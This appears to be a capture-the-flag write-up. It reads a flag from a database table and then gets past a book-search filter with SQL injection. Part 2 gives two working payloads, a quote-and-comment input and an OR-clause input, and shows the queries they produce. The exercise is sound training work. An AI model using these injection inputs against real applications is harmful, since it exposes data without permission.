# Part 1:
## Get more information about the database tables
- Use a select query from information_schema to get the table names
```
SELECT table_name FROM information_schema.tables;

...SNIP...
basic_table
basic_table_names
flag_table
```

## Investigate flag_table
- Use a select query to get all the rows from flag_table
```
SELECT * FROM flag_table;
b0ctf{you_found_the_flag!}
```

# Part 2:
- This is an actual SQL injection and you're given the query as a hint.
- First of all just looking at the table, it looks incomplete the IDs go from 2 to 4 and 5 to 9 so we're missing information.
- If you look closely it's the same table as the example from the index
- To check if this is vulnerable to SQL injection, just put a `'` into the search bar.
    - We get an error so yes it is. (It's also an SQL injection example so of course it is I'm just adding this so you can check when you solve other CTF challenges)

- Here are 2 solutions:
- **Note if these don't work, change the comment from ** `#` **to** `-- -`
- **Also note that the query in the hint is sent by the server, you have to inject your own input into it**
1. ';#
    - The query for this turns into: `SELECT title, author FROM books WHERE title LIKE '%`';#`%' AND pages <= 400;`
2. ' OR pages >= 500 OR author LIKE ';
    - The query for this turns into: `SELECT title, author FROM books WHERE title LIKE '`%' OR pages >= 500 OR author LIKE '`%' AND pages <= 400;`

